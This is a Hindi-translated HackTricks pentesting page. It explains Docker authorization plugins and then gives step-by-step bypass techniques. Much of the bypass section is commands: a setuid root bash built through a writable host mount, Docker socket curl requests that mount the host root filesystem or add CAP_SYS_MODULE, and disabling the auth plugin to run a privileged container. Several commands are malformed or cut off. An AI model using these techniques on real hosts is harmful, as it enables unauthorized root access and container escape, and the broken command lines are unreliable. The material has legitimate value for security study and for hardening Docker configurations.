<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>


**Docker** का आउट-ऑफ-द-बॉक्स **authorization** मॉडल **सब कुछ या कुछ नहीं** है। कोई भी उपयोगकर्ता जिसे Docker daemon तक पहुंच की अनुमति है, वह कोई भी Docker client **command** चला सकता है। Docker के Engine API का उपयोग करके daemon से संपर्क करने वाले कॉलर्स के लिए भी यही सच है। यदि आपको **अधिक एक्सेस कंट्रोल** की आवश्यकता है, तो आप **authorization plugins** बना सकते हैं और उन्हें अपने Docker daemon कॉन्फ़िगरेशन में जोड़ सकते हैं। एक authorization plugin का उपयोग करके, Docker प्रशासक Docker daemon तक पहुंच के लिए **विस्तृत एक्सेस नीतियां** कॉन्फ़िगर कर सकते हैं।

# मूल आर्किटेक्चर

Docker Auth plugins **बाहरी** **plugins** हैं जिनका उपयोग आप Docker Daemon को की गई **actions** की अनुमति/अस्वीकृति के लिए कर सकते हैं, यह **उपयोगकर्ता** पर **निर्भर** करता है जिसने इसे अनुरोध किया है और **अनुरोधित** **action** पर।

जब Docker **daemon** के लिए CLI के माध्यम से या Engine API के माध्यम से **HTTP** **request** की जाती है, तो **authentication** **subsystem** अनुरोध को स्थापित **authentication** **plugin**(s) को **पास** करता है। अनुरोध में उपयोगकर्ता (कॉलर) और कमांड संदर्भ शामिल होता है। **plugin** का जिम्मा होता है कि वह अनुरोध को **allow** करे या **deny** करे।

नीचे दिए गए सीक्वेंस डायग्राम्स में एक allow और deny authorization प्रवाह को दर्शाया गया है:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

प्रत्येक plugin को भेजी गई अनुरोध में **प्रमाणित उपयोगकर्ता, HTTP headers, और अनुरोध/प्रतिक्रिया शरीर** शामिल होता है। केवल **उपयोगकर्ता का नाम** और **प्रमाणीकरण विधि** का उपयोग किया जाता है जो plugin को पास किया जाता है। सबसे महत्वपूर्ण बात, **कोई** उपयोगकर्ता **credentials** या टोकन पास नहीं किए जाते हैं। अंत में, **सभी अनुरोध/प्रतिक्रिया शरीर** authorization plugin को नहीं भेजे जाते हैं। केवल वे अनुरोध/प्रतिक्रिया शरीर जहां `Content-Type` या तो `text/*` या `application/json` है, भेजे जाते हैं।

उन कमांड्स के लिए जो HTTP कनेक्शन को हाईजैक कर सकते हैं (`HTTP Upgrade`), जैसे कि `exec`, authorization plugin केवल प्रारंभिक HTTP अनुरोधों के लिए बुलाई जाती है। एक बार plugin द्वारा कमांड को मंजूरी दे दी जाती है, तो बाकी प्रवाह के लिए प्राधिकरण लागू नहीं होता है। विशेष रूप से, स्ट्रीमिंग डेटा को authorization plugins को पास नहीं किया जाता है। उन कमांड्स के लिए जो चंक्ड HTTP प्रतिक्रिया लौटाते हैं, जैसे कि `logs` और `events`, केवल HTTP अनुरोध को authorization plugins को भेजा जाता है।

अनुरोध/प्रतिक्रिया प्रोसेसिंग के दौरान, कुछ authorization प्रवाहों को Docker daemon से अतिरिक्त क्वेरीज करने की आवश्यकता हो सकती है। ऐसे प्रवाहों को पूरा करने के लिए, plugins एक सामान्य उपयोगकर्ता की तरह daemon API को कॉल कर सकते हैं। इन अतिरिक्त क्वेरीज को सक्षम करने के लिए, plugin को उचित प्रमाणीकरण और सुरक्षा नीतियों को कॉन्फ़िगर करने के लिए प्रशासक को साधन प्रदान करना चाहिए।

## कई Plugins

आप जिम्मेदार हैं अपने **plugin** को Docker daemon **startup** के हिस्से के रूप में **रजिस्टर करने** के लिए। आप **कई plugins इंस्टॉल कर सकते हैं और उन्हें एक साथ चेन कर सकते हैं**। यह चेन क्रमबद्ध हो सकती है। प्रत्येक अनुरोध daemon के माध्यम से क्रम में चेन के माध्यम से गुजरता है। केवल जब **सभी plugins संसाधन तक पहुंच की अनुमति देते हैं**, तब ही पहुंच प्रदान की जाती है।

# Plugin उदाहरण

## Twistlock AuthZ Broker

plugin [**authz**](https://github.com/twistlock/authz) आपको एक सरल **JSON** फ़ाइल बनाने की अनुमति देता है जिसे **plugin** **पढ़ेगा** और अनुरोधों को प्राधिकृत करेगा। इसलिए, यह आपको बहुत आसानी से नियंत्रित करने का अवसर देता है कि कौन से API endpoints प्रत्येक उपयोगकर्ता तक पहुंच सकते हैं।

यह एक उदाहरण है जो Alice और Bob को नए कंटेनर बनाने की अनुमति देगा: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

पृष्ठ [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) में आप अनुरोधित URL और action के बीच संबंध पा सकते हैं। पृष्ठ [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) में आप action नाम और action के बीच संबंध पा सकते हैं।

## सरल Plugin ट्यूटोरियल

आप यहां एक **समझने में आसान plugin** के साथ विस्तृत जानकारी पा सकते हैं: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

`README` और `plugin.go` कोड को पढ़ें ताकि समझ सकें कि यह कैसे काम कर रहा है।

# Docker Auth Plugin Bypass

## Enumerate access

मुख्य चीजें जांचने के लिए हैं **कौन से endpoints अनुमति हैं** और **HostConfig के कौन से मान अनुमति हैं**।

इस enumeration को करने के लिए आप टूल का **उपयोग कर सकते हैं** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## disallowed `run --privileged`

### न्यूनतम विशेषाधिकार
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### कंटेनर चलाना और फिर एक विशेषाधिकार प्राप्त सत्र प्राप्त करना

इस मामले में सिसएडमिन ने **उपयोगकर्ताओं को वॉल्यूम माउंट करने और `--privileged` फ्लैग के साथ कंटेनर चलाने या कंटेनर को कोई अतिरिक्त क्षमता देने की अनुमति नहीं दी:**
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
हालांकि, एक उपयोगकर्ता **चल रहे कंटेनर के अंदर एक शेल बना सकता है और उसे अतिरिक्त विशेषाधिकार दे सकता है**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
अब, उपयोगकर्ता कंटेनर से बाहर निकल सकता है [**पहले चर्चा की गई तकनीकों**](./#privileged-flag) का उपयोग करके और **होस्ट के अंदर विशेषाधिकार बढ़ा सकता है**।

## लिखने योग्य फोल्डर माउंट करें

इस मामले में सिसटम एडमिन ने **उपयोगकर्ताओं को `--privileged` फ्लैग के साथ कंटेनर चलाने की अनुमति नहीं दी** या कंटेनर को कोई अतिरिक्त क्षमता देने की अनुमति नहीं दी, और उसने केवल `/tmp` फोल्डर माउंट करने की अनुमति दी:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
ध्यान दें कि शायद आप `/tmp` फोल्डर को माउंट नहीं कर सकते हैं लेकिन आप **अलग लिखने योग्य फोल्डर** को माउंट कर सकते हैं। लिखने योग्य निर्देशिकाएँ खोजने के लिए आप यह कमांड उपयोग कर सकते हैं: `find / -writable -type d 2>/dev/null`

**ध्यान दें कि लिनक्स मशीन की सभी निर्देशिकाएँ suid बिट का समर्थन नहीं करती हैं!** suid बिट का समर्थन करने वाली निर्देशिकाओं की जांच करने के लिए `mount | grep -v "nosuid"` कमांड चलाएं। उदाहरण के लिए आमतौर पर `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` और `/var/lib/lxcfs` suid बिट का समर्थन नहीं करते हैं।

यह भी ध्यान दें कि अगर आप **`/etc` माउंट कर सकते हैं** या कोई अन्य फोल्डर **जिसमें कॉन्फ़िगरेशन फाइलें होती हैं**, तो आप उन्हें डॉकर कंटेनर से रूट के रूप में बदल सकते हैं ताकि **होस्ट में उनका दुरुपयोग करके विशेषाधिकार बढ़ा सकें** (शायद `/etc/shadow` में बदलाव करके)
{% endhint %}

## अनचेक्ड API एंडपॉइंट

सिसएडमिन की जिम्मेदारी जो इस प्लगइन को कॉन्फ़िगर कर रहा है, वह यह नियंत्रित करने की होगी कि प्रत्येक उपयोगकर्ता किस कार्रवाई को और किस विशेषाधिकार के साथ कर सकता है। इसलिए, अगर एडमिन एंडपॉइंट्स और विशेषताओं के साथ **ब्लैकलिस्ट** दृष्टिकोण अपनाता है, तो वह कुछ को **भूल सकता है** जो एक हमलावर को **विशेषाधिकार बढ़ाने की अनुमति दे सकता है।**

आप डॉकर API की जांच [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) पर कर सकते हैं।

## अनचेक्ड JSON संरचना

### रूट में Binds

संभव है कि जब सिसएडमिन ने डॉकर फ़ायरवॉल को कॉन्फ़िगर किया था तो उसने [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) के कुछ महत्वपूर्ण पैरामीटर जैसे कि "**Binds**" के बारे में **भूल गया** हो।\
निम्नलिखित उदाहरण में इस गलत कॉन्फ़िगरेशन का दुरुपयोग करके होस्ट के रूट (/) फोल्डर को माउंट करने वाला एक कंटेनर बनाने और चलाने की संभावना है:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
ध्यान दें कि इस उदाहरण में हम JSON में **`Binds`** पैरामीटर को रूट लेवल की कुंजी के रूप में उपयोग कर रहे हैं लेकिन API में यह **`HostConfig`** की कुंजी के अंतर्गत आता है।
{% endhint %}

### HostConfig में Binds

**Binds in root** के साथ दिए गए निर्देशों का पालन करते हुए, Docker API को यह **अनुरोध** करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### रूट में माउंट्स

**Binds in root** के साथ दिए गए निर्देशों का पालन करें, इस **अनुरोध** को Docker API के लिए प्रदर्शित करते हुए:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfig में Mounts

**Binds in root** के साथ दिए गए निर्देशों का पालन करते हुए, Docker API को यह **request** भेजें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## अनचेक्ड JSON एट्रिब्यूट

जब सिसएडमिन ने डॉकर फायरवॉल को कॉन्फ़िगर किया तो संभव है कि उसने [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) के पैरामीटर के किसी महत्वपूर्ण एट्रिब्यूट को भूल गया हो जैसे कि "**HostConfig**" के अंदर "**Capabilities**". निम्नलिखित उदाहरण में, इस मिसकॉन्फ़िगरेशन का दुरुपयोग करके **SYS\_MODULE** क्षमता के साथ एक कंटेनर बनाने और चलाने की संभावना है:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** वह कुंजी है जिसमें आमतौर पर **रोचक** **विशेषाधिकार** होते हैं जो कंटेनर से बाहर निकलने के लिए आवश्यक होते हैं। हालांकि, जैसा कि हमने पहले चर्चा की है, ध्यान दें कि इसके बाहर Binds का उपयोग करना भी काम करता है और यह आपको प्रतिबंधों को दरकिनार करने की अनुमति दे सकता है।
{% endhint %}

## प्लगइन को अक्षम करना

यदि **सिसएडमिन** ने **प्लगइन** को **अक्षम** करने की क्षमता को **रोकना** **भूल** गया हो, तो आप इसका फायदा उठाकर इसे पूरी तरह से अक्षम कर सकते हैं!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
याद रखें कि **escalating के बाद plugin को फिर से सक्षम करें**, अन्यथा **docker service का restart काम नहीं करेगा**!

## Auth Plugin Bypass लेखन

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# संदर्भ

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Learn AWS hacking से शुरुआत करें और बनें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी hacking tricks साझा करें.

</details>
